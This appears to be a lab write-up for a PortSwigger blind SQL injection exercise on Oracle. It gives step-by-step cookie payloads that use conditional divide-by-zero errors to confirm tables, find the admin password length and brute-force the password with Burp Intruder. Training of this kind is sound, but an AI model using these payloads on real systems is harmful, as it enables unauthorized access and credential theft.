## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/29df022f3c272f121a31dcaeb289e3dfc834ea9f/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Lab%20Description.png)


## Solution :

Request looks like this 

![image]()

Query looks like the following 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

#### Inducing error message -

1. Add an extra `'` symbol. We see that error appears because of incorrect ssql syntax 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''
```

![image]()


2. Add 2 extra `'` symbol, we get a response  back which indicates that the sql syntax is correct ('' indicates opening and closing of query & hence correct sql query)

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'''
```
![image]()


#### Conform the reason for error is invalid SQL query -

1. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting: `TrackingId=xyz'||(SELECT '')||'`

![image]()


In this case, notice that the query still appears to be invalid. This may be because the database used here is **ORACLE** & for that we need to specify a table called **DUAL**. Hence we got this error.

2. Try specifying a predictable table name in the query: `TrackingId=xyz'||(SELECT '' FROM dual)||'`


![image]()

We get  a response without any error , we can confrom that it is an ORACLE database *which requires all SELECT statements to explicitly specify a table name*. 

3. To conform this we can give an invalid query by specifying some random table `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`

![image]()

Hence confirmed.

#### Verify users table exist -

We can verify whether *users* table exist or not by the following command `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`


![image]()

No error -> implies that users table exist.

> NOTE - Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break > our concatenation. 

#### Checking whether administrator user is present in db -

We can exploit this error inducing queries to test if admin user is present or not

1. Set **(1=1)** ie. Condition is TRUE - `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![image]()

We receive an error. means the condition is *TRUE* so it threw an **divide by 0** error

2. Set **(1=2)** ie. Condition is FALSE - `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![image]()

We get a 200 response , means the condition failed and hence it returned nothing !

> NOTE- This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition 
> and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains
> a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the
> condition is true.

3. We can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username *administrator* exists: 

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![image]()

It shows an error which means there is indeed a user called *administrator*

#### Determine the length of admin's password -

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

RESPONSE -

1. ERROR -> Condition is TRUE
2. NUlll response -> Condition is FALSE

The length of password will be definitly > 1 , so we get an error.

![image]()

AUTOMATE THIS by Burp Intruder , by adding password length *(LENGTH>1)* as payload .

From req 20, we get an error where condition is *(LENGTH > 20)*

![image]()

This means that the password size is exactly **20** characters.

#### Bruteforce the admin's password -

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Add the length of password & each letter to be bruteforced as payloads.

ATTACK TYPE - CLUSTER BOMB
Payload 1 - Numbers
Payload 2 - Bruteforcer

We get the 20 responses which returned a error.

![image]()


Thus we got the admin's password - `8fysuozl95mngaem0abi`

Now we can log in as administrator ,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/2a9148d5da3c6f65473ae99d94c4082f32ac8dcb/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20conditional%20errors/Images/Lab%20Solution.png)




















